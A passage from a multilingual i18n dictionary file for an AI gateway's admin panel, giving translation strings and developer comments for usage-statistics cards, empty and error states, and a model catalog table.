ko: \"스트리밍 요청 수\" },\n  // 协议名来自 `GET /admin/api/models` 的 `protocols[].label`，**不在前端硬编码**。\n  \"usage.card.tokensTip\": { \"zh-CN\": \"只统计得到这几条协议的非流式响应：{protocols}。流式响应与其余协议的 token 网关看不到，所以这个数只会偏小。\", \"zh-TW\": \"只統計得到這幾條協定的非串流回應：{protocols}。串流回應與其餘協定的 token 網關看不到，所以這個數只會偏小。\", en: \"Only non-streaming responses of these protocols are counted: {protocols}. Streaming responses and the remaining protocols are invisible to the gateway, so this number can only be an undercount.\", ja: \"次のプロトコルの非ストリーミング応答のみを集計しています: {protocols}。ストリーミング応答とその他のプロトコルはゲートウェイからは見えないため、この数値は過小になります。\", ko: \"다음 프로토콜의 비스트리밍 응답만 집계합니다: {protocols}. 스트리밍 응답과 나머지 프로토콜은 게이트웨이에서 볼 수 없으므로 이 값은 실제보다 적게 나옵니다.\" },\n  \"usage.card.tokensTipUnknown\": { \"zh-CN\": \"覆盖了哪几条协议这一次没读出来。这个数只统计非流式响应，流式的 token 网关看不到。\", \"zh-TW\": \"涵蓋了哪幾條協定這一次沒讀出來。這個數只統計非串流回應，串流的 token 網關看不到。\", en: \"Could not read which protocols are covered this time. This number counts non-streaming responses only; streaming tokens are invisible to the gateway.\", ja: \"どのプロトコルが対象かを今回は取得できませんでした。この数値は非ストリーミング応答のみを集計しており、ストリーミングのトークンはゲートウェイからは見えません。\", ko: \"이번에는 어떤 프로토콜이 포함되는지 읽지 못했습니다. 이 값은 비스트리밍 응답만 집계하며 스트리밍 토큰은 게이트웨이에서 볼 수 없습니다.\" },\n  \"usage.card.streamingTip\": { \"zh-CN\": \"单列一栏，好让 Token 那一格缺掉的正是这些请求这件事看得见。\", \"zh-TW\": \"單列一欄，好讓 Token 那一格缺掉的正是這些請求這件事看得見。\", en: \"Listed separately so that the gap in the token count is visible: these are exactly the requests it cannot see.\", ja: \"トークン数に欠けているのがまさにこれらのリクエストであることが分かるよう、独立した項目にしています。\", ko: \"토큰 수에서 빠진 것이 바로 이 요청들이라는 사실이 보이도록 별도 항목으로 둡니다.\" },\n\n  // ── 单元格的两根破折号（P3d Task 5 评审 I15 的裁定）────────────────────────\n  // ⚠️ **`–`（EN DASH）与 `—`（EM DASH）说的是两件事，视觉上必须分得开。**\n  // 前者：这一次读成功了，只是这一格没有样本 / 没有分母；\n  // 后者：整块就没读出来，我们不知道。\n  \"usage.cell.noneTip\":    { \"zh-CN\": \"这一次读成功了，只是这段时间没有可用的样本。\", \"zh-TW\": \"這一次讀成功了，只是這段時間沒有可用的樣本。\", en: \"The read succeeded; there simply were no samples in this period.\", ja: \"取得には成功しましたが、この期間にサンプルがありませんでした。\", ko: \"읽기는 성공했지만 이 기간에 사용할 샘플이 없습니다.\" },\n  \"usage.cell.unknownTip\": { \"zh-CN\": \"这一格读不出来。显示的不是 0——我们不知道它是多少。\", \"zh-TW\": \"這一格讀不出來。顯示的不是 0——我們不知道它是多少。\", en: \"This value could not be read. It is not zero — we do not know what it is.\", ja: \"この値は取得できませんでした。0 ではなく、値が分からないという意味です。\", ko: \"이 값을 읽지 못했습니다. 0이 아니라 값을 알 수 없다는 뜻입니다.\" },\n  // `≈` 的 tooltip。落盘间隔那个数**从 capabilities 取，不在前端算死**。\n  \"usage.approxTip\":        { \"zh-CN\": \"近似值：Tier-1 在并发下会少计；Tier-2 还有一段最长 {flush} 的未落盘窗口。\", \"zh-TW\": \"近似值：Tier-1 在並行下會少計；Tier-2 還有一段最長 {flush} 的未落盤窗口。\", en: \"Approximate: Tier-1 undercounts under concurrency, and Tier-2 has an unflushed window of up to {flush}.\", ja: \"概算値: Tier-1 は並行時に少なく数え、Tier-2 には最大 {flush} の未書き込み時間があります。\", ko: \"근사값: Tier-1은 동시 요청에서 적게 세며, Tier-2에는 최대 {flush}의 미기록 구간이 있습니다.\" },\n  \"usage.approxTipUnknown\": { \"zh-CN\": \"近似值：Tier-1 在并发下会少计；Tier-2 还有一段未落盘窗口，它有多长这一次没读出来。\", \"zh-TW\": \"近似值：Tier-1 在並行下會少計；Tier-2 還有一段未落盤窗口，它有多長這一次沒讀出來。\", en: \"Approximate: Tier-1 undercounts under concurrency, and Tier-2 has an unflushed window whose length could not be read this time.\", ja: \"概算値: Tier-1 は並行時に少なく数え、Tier-2 には未書き込み時間がありますが、その長さは今回取得できませんでした。\", ko: \"근사값: Tier-1은 동시 요청에서 적게 세며, Tier-2에는 미기록 구간이 있으나 그 길이를 이번에는 읽지 못했습니다.\" },\n  // ⚠️ **「不完整」这个标记本身就是全局约束 9 的一半**：伪造的不只是 `0`，\n  //    还有「这份数据是全的」这个印象。\n  \"usage.incomplete\":    { \"zh-CN\": \"不完整\", \"zh-TW\": \"不完整\", en: \"Incomplete\", ja: \"不完全\", ko: \"불완전\" },\n  \"usage.incompleteTip\": { \"zh-CN\": \"这段区间里有 {malformed} 个分片是畸形的，读不回来。下面这些数字缺了那几块，不是完整的用量。\", \"zh-TW\": \"這段區間裡有 {malformed} 個分片是畸形的，讀不回來。下面這些數字缺了那幾塊，不是完整的用量。\", en: \"{malformed} shard(s) in this range are malformed and could not be read. The numbers below are missing those parts — this is not the complete usage.\", ja: \"この期間には不正なシャードが {malformed} 件あり、読み取れませんでした。以下の数値はその分が欠けており、完全な使用量ではありません。\", ko: \"이 구간에 손상된 샤드가 {malformed}개 있어 읽지 못했습니다. 아래 수치는 그만큼 빠져 있어 완전한 사용량이 아닙니다.\" },\n\n  // ── 九条 note code，各自一句（`src/http/admin/handlers/usage.ts` 的 `USAGE_NOTES`）──\n  // ⚠️ **后端加第十条时这里不会有任何东西红**（那张表的穷举用例证明的是\n  //    「已列出的八种互不相同」，不是「没有第九种」）⇒ 表外的 code 走\n  //    `usage.note.unknown`，把原码照实显示出来。\n  \"usage.note.tier2Off\":          { \"zh-CN\": \"时间序列统计没有开启，这个部署没有在记账。\", \"zh-TW\": \"時間序列統計沒有開啟，這個部署沒有在記帳。\", en: \"Time-series stats are off; this deployment is not recording usage.\", ja: \"時系列統計が無効のため、このデプロイでは使用量を記録していません。\", ko: \"시계열 통계가 꺼져 있어 이 배포는 사용량을 기록하지 않습니다.\" },\n  \"usage.note.clockUnavailable\":  { \"zh-CN\": \"服务端时钟给不出有限数字，区间与保留期都算不出来。这不是「没有数据」。\", \"zh-TW\": \"伺服器時鐘給不出有限數字，區間與保留期都算不出來。這不是「沒有資料」。\", en: \"The server clock did not return a finite value, so neither the range nor the retention window can be computed. This is not “no data”.\", ja: \"サーバー時計が有限の値を返さないため、期間も保持期間も計算できません。これは「データがない」という意味ではありません。\", ko: \"서버 시계가 유한한 값을 주지 않아 구간과 보관 기간을 계산할 수 없습니다. 이것은 “데이터 없음”이 아닙니다.\" },\n  \"usage.note.readFailed\":        { \"zh-CN\": \"读取存储时出错，这段时间的数字整块拿不到。显示的破折号不是 0。\", \"zh-TW\": \"讀取儲存時出錯，這段時間的數字整塊拿不到。顯示的破折號不是 0。\", en: \"Reading storage failed, so none of the numbers for this period are available. The dashes are not zeros.\", ja: \"ストレージの読み取りに失敗したため、この期間の数値は取得できません。表示のダッシュは 0 ではありません。\", ko: \"스토리지 읽기에 실패하여 이 기간의 수치를 가져오지 못했습니다. 표시된 대시는 0이 아닙니다.\" },\n  \"usage.note.rangeClamped\":      { \"zh-CN\": \"要的区间被夹到了保留期之内，只显示了能拿到的那一段。上面的覆盖区间是服务端真正查过的那一对。\", \"zh-TW\": \"要的區間被夾到了保留期之內，只顯示了能拿到的那一段。上面的涵蓋區間是伺服器真正查過的那一對。\", en: \"The requested range was clamped into the retention window; only the part that could be fetched is shown. The covered range above is what the server actually queried.\", ja: \"要求した期間は保持期間内に丸められ、取得できた部分のみを表示しています。上の対象期間がサーバーが実際に照会した範囲です。\", ko: \"요청한 구간이 보관 기간 안으로 조정되어 가져올 수 있는 부분만 표시합니다. 위의 대상 구간이 서버가 실제로 조회한 범위입니다.\" },\n  \"usage.note.dateOutOfRetention\": { \"zh-CN\": \"这一天整个落在保留期之外。不是那天没有请求，是那天的记录已经不在了。\", \"zh-TW\": \"這一天整個落在保留期之外。不是那天沒有請求，是那天的記錄已經不在了。\", en: \"This day lies entirely outside the retention window. It is not that there were no requests — that day's records are gone.\", ja: \"この日は保持期間の外です。リクエストがなかったのではなく、その日の記録がもう残っていません。\", ko: \"이 날짜는 보관 기간을 완전히 벗어났습니다. 요청이 없었던 것이 아니라 그날의 기록이 남아 있지 않습니다.\" },\n  \"usage.note.noShards\":          { \"zh-CN\": \"读成功了，这段区间里一个分片都没有——这个部署确实没有记下任何用量。\", \"zh-TW\": \"讀成功了，這段區間裡一個分片都沒有——這個部署確實沒有記下任何用量。\", en: \"The read succeeded and there were no shards at all in this range — this deployment genuinely recorded no usage.\", ja: \"読み取りには成功しましたが、この期間にシャードが 1 件もありません。このデプロイは実際に使用量を記録していません。\", ko: \"읽기는 성공했지만 이 구간에 샤드가 하나도 없습니다. 이 배포는 실제로 사용량을 기록하지 않았습니다.\" },\n  \"usage.note.allMalformed\":      { \"zh-CN\": \"读到了分片，但每一个都是畸形的——这段时间的用量我们一无所知。请去查存储里是谁写的。\", \"zh-TW\": \"讀到了分片，但每一個都是畸形的——這段時間的用量我們一無所知。請去查儲存裡是誰寫的。\", en: \"Shards were found but every one of them is malformed — we know nothing about usage in this period. Check what wrote them in storage.\", ja: \"シャードは見つかりましたが、すべて不正な形式です。この期間の使用量は一切分かりません。ストレージに何が書き込まれたか確認してください。\", ko: \"샤드를 찾았지만 모두 손상되어 있습니다. 이 기간의 사용량을 전혀 알 수 없습니다. 스토리지에 무엇이 기록되었는지 확인하세요.\" },\n  \"usage.note.partialMalformed\":  { \"zh-CN\": \"一部分分片是畸形的，下面这些数字缺了那几块。请去查存储里是谁写的。\", \"zh-TW\": \"一部分分片是畸形的，下面這些數字缺了那幾塊。請去查儲存裡是誰寫的。\", en: \"Some shards are malformed, so the numbers below are missing those parts. Check what wrote them in storage.\", ja: \"一部のシャードが不正な形式のため、以下の数値はその分が欠けています。ストレージに何が書き込まれたか確認してください。\", ko: \"일부 샤드가 손상되어 아래 수치에서 그만큼 빠져 있습니다. 스토리지에 무엇이 기록되었는지 확인하세요.\" },\n  \"usage.note.noRequestDetail\":   { \"zh-CN\": \"这里没有逐请求流水，只有按小时 / 模型 / 协议的分解。需要逐请求粒度请看容器 stdout 或 Cloudflare Workers Logs。\", \"zh-TW\": \"這裡沒有逐請求流水，只有按小時 / 模型 / 協定的分解。需要逐請求粒度請看容器 stdout 或 Cloudflare Workers Logs。\", en: \"There is no per-request log here, only breakdowns by hour, model and protocol. For per-request detail see the container stdout or Cloudflare Workers Logs.\", ja: \"ここにはリクエスト単位のログはなく、時間 / モデル / プロトコル別の内訳のみです。リクエスト単位が必要な場合はコンテナの stdout または Cloudflare Workers Logs を参照してください。\", ko: \"여기에는 요청별 로그가 없고 시간 / 모델 / 프로토콜별 분해만 있습니다. 요청 단위가 필요하면 컨테이너 stdout 또는 Cloudflare Workers Logs를 확인하세요.\" },\n  // ⚠️ **「这段时间真的是 0」必须有自己的一句话**：后端第 ④ 种状态\n  //（有分片、只是请求数是 0）的 `note` 是 `null`，那一档没有任何 code 可读，\n  //    而它与「读不出来」在数字上都是「什么都没有」——不说出来就是三态混一。\n  \"usage.empty\":                  { \"zh-CN\": \"这段区间里一次请求都没有。这不是读取失败——我们确实读到了，答案就是零。\", \"zh-TW\": \"這段區間裡一次請求都沒有。這不是讀取失敗——我們確實讀到了，答案就是零。\", en: \"There were no requests at all in this range. This is not a read failure — the read succeeded and the answer is zero.\", ja: \"この期間にリクエストは 1 件もありませんでした。読み取り失敗ではなく、取得に成功したうえで答えが 0 です。\", ko: \"이 구간에는 요청이 한 건도 없었습니다. 읽기 실패가 아니라, 읽기에 성공했고 답이 0입니다.\" },\n  \"usage.note.unknown\":           { \"zh-CN\": \"服务端给了一个这个面板还不认识的状态码：{code}。原样显示在这里，好让你拿它去查后端。\", \"zh-TW\": \"伺服器給了一個這個面板還不認識的狀態碼：{code}。原樣顯示在這裡，好讓你拿它去查後端。\", en: \"The server returned a status code this panel does not recognise yet: {code}. It is shown verbatim so you can look it up in the backend.\", ja: \"この画面がまだ認識していないステータスコードがサーバーから返されました: {code}。バックエンドで調べられるよう、そのまま表示しています。\", ko: \"이 화면이 아직 인식하지 못하는 상태 코드를 서버가 반환했습니다: {code}. 백엔드에서 찾아볼 수 있도록 그대로 표시합니다.\" },\n\n  // ── Tier-2 关闭时的说明卡（设计 §10.6：不渲染空图表）──────────────────────\n  // ⚠️⚠️ **设计 §10.6 写的是「『开启时间序列统计』按钮（跳设置页）」，本任务\n  //    刻意没有做那颗按钮，理由写在 `admin-ui/js/sec-usage.js` 的说明卡那一段：\n  //    `usageStatsEnabled` 今天不在 `EDITABLE` 里、设置页上没有它的入口\n  //    （`src/core/config.ts` 的 `usageStatsEnabled` 上方逐字写着这一条），\n  //    跳过去只会让运维在一个没有这个开关的页面上找一圈。这里改成写清怎么开。\n  \"usage.off.title\": { \"zh-CN\": \"时间序列统计没有开启\", \"zh-TW\": \"時間序列統計沒有開啟\", en: \"Time-series stats are off\", ja: \"時系列統計が無効です\", ko: \"시계열 통계가 꺼져 있습니다\" },\n  \"usage.off.body\":  { \"zh-CN\": \"这个部署没有在按天记账，所以这里没有可以显示的数字。不画空图表是刻意的——一张全是 0 的图会被读成「这段时间没人用」。\", \"zh-TW\": \"這個部署沒有在按天記帳，所以這裡沒有可以顯示的數字。不畫空圖表是刻意的——一張全是 0 的圖會被讀成「這段時間沒人用」。\", en: \"This deployment is not recording daily usage, so there are no numbers to show. Deliberately no empty chart is drawn: a chart of zeros reads as “nobody used it”.\", ja: \"このデプロイは日次の使用量を記録していないため、表示できる数値がありません。空のグラフを描かないのは意図的です。0 ばかりのグラフは「誰も使っていない」と読まれてしまいます。\", ko: \"이 배포는 일별 사용량을 기록하지 않으므로 표시할 수치가 없습니다. 빈 차트를 그리지 않는 것은 의도적입니다. 0으로 채워진 차트는 “아무도 쓰지 않았다”로 읽힙니다.\" },\n  \"usage.off.howto\": { \"zh-CN\": \"要开启：把环境变量 USAGE_STATS_ENABLED 设成 true，然后重启容器（Cloudflare Worker 上是等 isolate 回收）。这个开关是建应用时读一次的，设置页上没有它的入口。\", \"zh-TW\": \"要開啟：把環境變數 USAGE_STATS_ENABLED 設成 true，然後重啟容器（Cloudflare Worker 上是等 isolate 回收）。這個開關是建應用時讀一次的，設定頁上沒有它的入口。\", en: \"To enable it: set the environment variable USAGE_STATS_ENABLED to true, then restart the container (on Cloudflare Workers, wait for the isolate to recycle). This switch is read once when the app is built, so the settings page has no control for it.\", ja: \"有効にするには: 環境変数 USAGE_STATS_ENABLED を true に設定し、コンテナを再起動してください（Cloudflare Workers では isolate の再生成を待ちます）。このスイッチはアプリ構築時に一度だけ読まれるため、設定ページには項目がありません。\", ko: \"켜려면: 환경 변수 USAGE_STATS_ENABLED를 true로 설정한 뒤 컨테이너를 재시작하세요(Cloudflare Workers에서는 isolate 재생성을 기다립니다). 이 스위치는 앱을 만들 때 한 번만 읽으므로 설정 페이지에는 항목이 없습니다.\" },\n  \"usage.off.cost\":  { \"zh-CN\": \"开启的代价：每个实例最长每 {flush} 往存储写一次分片。在 Cloudflare KV 上那是写配额，请对着部署文档里的配额账估一下再开。\", \"zh-TW\": \"開啟的代價：每個實例最長每 {flush} 往儲存寫一次分片。在 Cloudflare KV 上那是寫配額，請對著部署文件裡的配額帳估一下再開。\", en: \"What it costs: each instance writes a shard to storage at most once every {flush}. On Cloudflare KV that is write quota — check the quota budget in the deployment docs before turning it on.\", ja: \"コスト: 各インスタンスは最短で {flush} ごとにシャードをストレージへ書き込みます。Cloudflare KV では書き込みクォータを消費するため、デプロイ文書のクォータ計算を確認してから有効にしてください。\", ko: \"비용: 각 인스턴스가 최소 {flush}마다 스토리지에 샤드를 한 번 기록합니다. Cloudflare KV에서는 쓰기 쿼터를 소모하므로 배포 문서의 쿼터 계산을 확인한 뒤 켜세요.\" },\n  \"usage.off.costUnknown\": { \"zh-CN\": \"开启的代价：每个实例会定期往存储写一次分片。间隔有多长这一次没读出来（capabilities 没拿到）。\", \"zh-TW\": \"開啟的代價：每個實例會定期往儲存寫一次分片。間隔有多長這一次沒讀出來（capabilities 沒拿到）。\", en: \"What it costs: each instance periodically writes a shard to storage. The interval could not be read this time (capabilities were not available).\", ja: \"コスト: 各インスタンスは定期的にシャードをストレージへ書き込みます。その間隔は今回取得できませんでした（capabilities を取得できていません）。\", ko: \"비용: 각 인스턴스가 주기적으로 스토리지에 샤드를 기록합니다. 그 간격은 이번에 읽지 못했습니다(capabilities를 가져오지 못함).\" },\n  \"usage.off.tier1\": { \"zh-CN\": \"顺带一提：Key 池板块里逐把 key 的累计计数与这个开关无关，它在这里关着的时候照样可用。\", \"zh-TW\": \"順帶一提：Key 池板塊裡逐把 key 的累計計數與這個開關無關，它在這裡關著的時候照樣可用。\", en: \"Note: the per-key counters in the key pool section are unrelated to this switch and remain available while it is off.\", ja: \"補足: キープール画面のキーごとの累計カウントはこのスイッチとは無関係で、無効のままでも利用できます。\", ko: \"참고: 키 풀 화면의 키별 누적 카운트는 이 스위치와 무관하며, 꺼져 있어도 계속 사용할 수 있습니다.\" },\n\n  // ── 日汇总表与单日下钻 ─────────────────────────────────────────────────────\n  \"usage.table.title\":     { \"zh-CN\": \"按天\", \"zh-TW\": \"按天\", en: \"By day\", ja: \"日別\", ko: \"일별\" },\n  \"usage.table.date\":      { \"zh-CN\": \"日期（UTC）\", \"zh-TW\": \"日期（UTC）\", en: \"Date (UTC)\", ja: \"日付（UTC）\", ko: \"날짜(UTC)\" },\n  \"usage.table.requests\":  { \"zh-CN\": \"请求\", \"zh-TW\": \"請求\", en: \"Requests\", ja: \"リクエスト\", ko: \"요청\" },\n  \"usage.table.success\":   { \"zh-CN\": \"成功\", \"zh-TW\": \"成功\", en: \"Success\", ja: \"成功\", ko: \"성공\" },\n  \"usage.table.errors\":    { \"zh-CN\": \"错误\", \"zh-TW\": \"錯誤\", en: \"Errors\", ja: \"エラー\", ko: \"오류\" },\n  \"usage.table.tokens\":    { \"zh-CN\": \"Token 入 / 出\", \"zh-TW\": \"Token 入 / 出\", en: \"Tokens in / out\", ja: \"トークン 入 / 出\", ko: \"토큰 입력 / 출력\" },\n  \"usage.table.streaming\": { \"zh-CN\": \"流式\", \"zh-TW\": \"串流\", en: \"Streaming\", ja: \"ストリーミング\", ko: \"스트리밍\" },\n  \"usage.table.latency\":   { \"zh-CN\": \"平均延迟（毫秒）\", \"zh-TW\": \"平均延遲（毫秒）\", en: \"Avg latency (ms)\", ja: \"平均レイテンシ（ミリ秒）\", ko: \"평균 지연(밀리초)\" },\n  \"usage.table.empty\":     { \"zh-CN\": \"这段区间里没有可以列出的日子。\", \"zh-TW\": \"這段區間裡沒有可以列出的日子。\", en: \"There are no days to list in this range.\", ja: \"この期間に一覧できる日はありません。\", ko: \"이 구간에 나열할 날짜가 없습니다.\" },\n  // ⚠️ **「读不出来」与「没有可以列出的日子」是两句话**（P3d Task 5 评审 C1）：\n  //    `read_failed` 那一档 `days` 是 null ⇒ 行数也是 0，照上面那句渲染\n  //    等于把一次读取失败说成「这段时间本来就没有日子」。\n  \"usage.table.unavailable\": { \"zh-CN\": \"这段区间的按天数据读不出来，所以这里是空的——不是这段时间没有日子。\", \"zh-TW\": \"這段區間的按天資料讀不出來，所以這裡是空的——不是這段時間沒有日子。\", en: \"The per-day data for this range could not be read, so this is empty — it is not that the range has no days.\", ja: \"この期間の日次データを取得できなかったため空になっています。期間に日がないという意味ではありません。\", ko: \"이 구간의 일별 데이터를 읽지 못해 비어 있습니다. 구간에 날짜가 없다는 뜻이 아닙니다.\" },\n  \"usage.table.drill\":     { \"zh-CN\": \"下钻\", \"zh-TW\": \"下鑽\", en: \"Drill down\", ja: \"詳細\", ko: \"자세히\" },\n  \"usage.detail.title\":    { \"zh-CN\": \"{date} 的分解\", \"zh-TW\": \"{date} 的分解\", en: \"Breakdown for {date}\", ja: \"{date} の内訳\", ko: \"{date} 분해\" },\n  \"usage.detail.hours\":    { \"zh-CN\": \"按小时（UTC）\", \"zh-TW\": \"按小時（UTC）\", en: \"By hour (UTC)\", ja: \"時間別（UTC）\", ko: \"시간별(UTC)\" },\n  \"usage.detail.models\":   { \"zh-CN\": \"按模型\", \"zh-TW\": \"按模型\", en: \"By model\", ja: \"モデル別\", ko: \"모델별\" },\n  \"usage.detail.protocols\": { \"zh-CN\": \"按协议\", \"zh-TW\": \"按協定\", en: \"By protocol\", ja: \"プロトコル別\", ko: \"프로토콜별\" },\n  \"usage.detail.hour\":     { \"zh-CN\": \"小时\", \"zh-TW\": \"小時\", en: \"Hour\", ja: \"時\", ko: \"시\" },\n  \"usage.detail.model\":    { \"zh-CN\": \"模型\", \"zh-TW\": \"模型\", en: \"Model\", ja: \"モデル\", ko: \"모델\" },\n  \"usage.detail.protocol\": { \"zh-CN\": \"协议\", \"zh-TW\": \"協定\", en: \"Protocol\", ja: \"プロトコル\", ko: \"프로토콜\" },\n  \"usage.detail.close\":    { \"zh-CN\": \"收起\", \"zh-TW\": \"收起\", en: \"Collapse\", ja: \"閉じる\", ko: \"접기\" },\n  \"usage.detail.empty\":    { \"zh-CN\": \"这一天没有可以分解的记录。\", \"zh-TW\": \"這一天沒有可以分解的記錄。\", en: \"There is nothing to break down for this day.\", ja: \"この日は内訳を表示できる記録がありません。\", ko: \"이 날짜에는 분해할 기록이 없습니다.\" },\n  // ⚠️ 与 `usage.table.unavailable` 同一条理由，C1 点名的「第三屏」：分片全坏 /\n  //    读取失败 / 落在保留期外时三个 map 合出来都是空的，照上面那句渲染就是\n  //    把「我们什么都不知道」说成「这一天没有记录」。\n  // ⚠️ **单日口径，不能拿 `usage.incompleteTip` 顶替**（定向复评 N7）：\n  //    后者逐字写着「这段区间里」，而下钻说的是**一天**。\n  \"usage.detail.incomplete\": { \"zh-CN\": \"这一天有 {malformed} 个分片是畸形的，读不回来。下面这些数字缺了那几块，不是这一天完整的用量。\", \"zh-TW\": \"這一天有 {malformed} 個分片是畸形的，讀不回來。下面這些數字缺了那幾塊，不是這一天完整的用量。\", en: \"{malformed} shard(s) for this day are malformed and could not be read. The numbers below are missing those parts — this is not the complete usage for the day.\", ja: \"この日は不正なシャードが {malformed} 件あり、読み取れませんでした。以下の数値はその分が欠けており、この日の完全な使用量ではありません。\", ko: \"이 날짜에 손상된 샤드가 {malformed}개 있어 읽지 못했습니다. 아래 수치는 그만큼 빠져 있어 이 날짜의 완전한 사용량이 아닙니다.\" },\n  \"usage.detail.unavailable\": { \"zh-CN\": \"这一天的分解读不出来，所以这里是空的——不是这一天没有记录。\", \"zh-TW\": \"這一天的分解讀不出來，所以這裡是空的——不是這一天沒有記錄。\", en: \"The breakdown for this day could not be read, so this is empty — it is not that the day has no records.\", ja: \"この日の内訳を取得できなかったため空になっています。この日に記録がないという意味ではありません。\", ko: \"이 날짜의 분해를 읽지 못해 비어 있습니다. 이 날짜에 기록이 없다는 뜻이 아닙니다.\" },\n\n  // ── 未落盘的尾巴（`pending` 块）───────────────────────────────────────────\n  // ⚠️ 判据是 `count`，**不是 `ms`**：`ms` 数的是「距上一次落盘*尝试*多久」，\n  //    `count > 0 && ms ≈ 0` 要读作「刚试过、没写成」。\n  \"usage.pending\":          { \"zh-CN\": \"还有 {count} 条计数没有落盘，上面的数字少了这一截。\", \"zh-TW\": \"還有 {count} 條計數沒有落盤，上面的數字少了這一截。\", en: \"{count} counter(s) have not been flushed yet; the numbers above are short by that much.\", ja: \"未書き込みのカウントが {count} 件あります。上の数値はその分少なくなっています。\", ko: \"아직 기록되지 않은 카운트가 {count}건 있습니다. 위 수치는 그만큼 적습니다.\" },\n  \"usage.pendingExhausted\": { \"zh-CN\": \"写配额已经耗尽，还有 {count} 条计数暂时写不进存储。这不是「没有尾巴」，是写不进去。\", \"zh-TW\": \"寫配額已經耗盡，還有 {count} 條計數暫時寫不進儲存。這不是「沒有尾巴」，是寫不進去。\", en: \"The write budget is exhausted; {count} counter(s) cannot be written to storage for now. This is not “nothing pending” — the writes are failing.\", ja: \"書き込み予算を使い切ったため、{count} 件のカウントを当面ストレージへ書き込めません。「未書き込みがない」のではなく、書き込めていません。\", ko: \"쓰기 예산이 소진되어 {count}건의 카운트를 당분간 스토리지에 기록할 수 없습니다. “대기 중인 것이 없음”이 아니라 기록에 실패하고 있습니다.\" },\n\n  // ── 模型板块（P3d Task 6，设计 §10.7 / §11）────────────────────────────────\n  // ⚠️⚠️ **这一段里一个端点路径、一个协议 id 都没有，是刻意的**（P3d 全局约束 15）：\n  //    协议的展示名是**专名**，由 `GET /admin/api/models` 的 `protocols[].label` 直接\n  //    给出，翻译它只会制造歧义；端点由响应的 `endpoints[]` 原样渲染。\n  //    ⇒ 字典里只放**要翻译的东西**：列名、三个形态名、两句 tooltip、三句空态说明。\n  // ⚠️ 「类型」是那一列的**显示名**，代码里那个字段一律叫 `modality`（评审 Minor 9）。\n  \"models.title\":            { \"zh-CN\": \"模型\", \"zh-TW\": \"模型\", en: \"Models\", ja: \"モデル\", ko: \"모델\" },\n  \"models.desc\":             { \"zh-CN\": \"本网关认得的模型，以及每个模型在哪几条协议上真的可用。\", \"zh-TW\": \"本閘道認得的模型，以及每個模型在哪幾條協定上真的可用。\", en: \"The models this gateway knows about, and which protocols each one is actually available on.\", ja: \"このゲートウェイが認識しているモデルと、各モデルが実際に利用できるプロトコルです。\", ko: \"이 게이트웨이가 인식하는 모델과, 각 모델이 실제로 사용 가능한 프로토콜입니다.\" },\n  \"models.table.title\":      { \"zh-CN\": \"模型目录\", \"zh-TW\": \"模型目錄\", en: \"Model catalog\", ja: \"モデルカタログ\", ko: \"모델 카탈로그\" },\n  \"models.filter.label\":     { \"zh-CN\": \"按协议筛选\", \"zh-TW\": \"依協定篩選\", en: \"Filter by protocol\", ja: \"プロトコルで絞り込み\", ko: \"프로토콜로 필터\" },\n  \"models.filter.all\":       { \"zh-CN\": \"全部\", \"zh-TW\": \"全部\", en: \"All\", ja: \"すべて\", ko: \"전체\" },\n  \"models.col.id\":           { \"zh-CN\": \"模型 ID\", \"zh-TW\": \"模型 ID\", en: \"Model ID\", ja: \"モデル ID\", ko: \"모델 ID\" },\n  \"models.col.modality\":     { \"zh-CN\": \"类型\", \"zh-TW\": \"類型\", en: \"Type\", ja: \"種類\", ko: \"유형\" },\n  \"models.col.protocols\":    { \"zh-CN\": \"协议可用性\", \"zh-TW\": \"協定可用性\", en: \"Protocol availability\", ja: \"プロトコル対応\", ko: \"프로토콜 지원\" },\n  \"models.col.endpoints\":    { \"zh-CN\": \"端点\", \"zh-TW\": \"端點\", en: \"Endpoints\", ja: \"エンドポイント\", ko: \"엔드포인트\" },\n  \"models.modality.chat\":    { \"zh-CN\": \"对话\", \"zh-TW\": \"對話\", en: \"Chat\", ja: \"チャット\", ko: \"대화\" },\n  \"models.modality.image\":   { \"zh-CN\": \"图片\", \"zh-TW\": \"圖片\", en: \"Image\", ja: \"画像\", ko: \"이미지\" },\n  \"models.modality.video\":   { \"zh-CN\": \"视频\", \"zh-TW\": \"影片\", en: \"Video\", ja: \"動画\", ko: \"동영상\" },\n  // ⚠️ 灰徽章那一句必须说「不可用」，**不许说「未知」**：矩阵里的每一格都是从目录里\n  //    读出来的确定答案，把它说成「未知」就把一句确定的话降级成了含糊话。\n  \"models.badge.yes\":        { \"zh-CN\": \"这个模型在这条协议上可用\", \"zh-TW\": \"這個模型在這條協定上可用\", en: \"This model is available on this protocol\", ja: \"このモデルはこのプロトコルで利用できます\", ko: \"이 모델은 이 프로토콜에서 사용할 수 있습니다\" },\n  \"models.badge.no\":         { \"zh-CN\": \"这个模型在这条协议上不可用\", \"zh-TW\": \"這個模型在這條協定上不可用\", en: \"This model is not available on this protocol\", ja: \"このモデルはこのプロトコルでは利用できません\", ko: \"이 모델은 이 프로토콜에서 사용할 수 없습니다\" },\n  // ⚠️ 三句空态说明**互不重叠**，理由与用量板块那三态是同一条（全局约束 9）：\n  //    「一个模型都没有」「这条协议上没有」「读不出来」在屏幕上必须分得开。\n  \"models.empty\":            { \"zh-CN\": \"这份目录里一个模型都没有。\", \"zh-TW\": \"這份目錄裡一個模型都沒有。\", en: \"This catalog contains no models.\", ja: \"このカタログにはモデルが 1 つもありません。\", ko: \"이 카탈로그에는 모델이 하나도 없습니다.\" },\n  \"models.filterEmpty\":      { \"zh-CN\": \"这条协议上没有可用的模型。\", \"zh-TW\": \"這條協定上沒有可用的模型。\", en: \"No models are available on this protocol.\", ja: \"このプロトコルで利用できるモデルはありません。\", ko: \"이 프로토콜에서 사용할 수 있는 모델이 없습니다.\" },\n  \"models.unavailable\":      { \"zh-CN\": \"模型目录读不出来，所以这里是一根破折号——不是这个网关一个模型都没有。\", \"zh-TW\": \"模型目錄讀不出來，所以這裡是一根破折號——不是這個閘道一個模型都沒有。\", en: \"The model catalog could not be read, so this shows a dash — it is not that the gateway has no models.\", ja: \"モデルカタログを取得できなかったためダッシュを表示しています。ゲートウェイにモデルがないという意味ではありません。\", ko: \"모델 카탈로그를 읽지 못해 대시를 표시합니다. 게이트웨이에 모델이 없다는 뜻이 아닙니다.\" },\n\n  // ── Playground 板块（P3d Task 10）────────────────────────────────────────\n  // ⚠️ **这一段一个 `{占位符}` 都没有，是刻意的**：`scripts/check-i18n.mjs` 的第 ⑧ 条\n  //    要求带占位符的 key 每一次以字面量出现时后面都紧跟一个 `,`，而本板块把大量\n  //    key 交给 `elI18n(tag, key)`（第二个参数后面确实是 `,` 或 `)`），\n  //    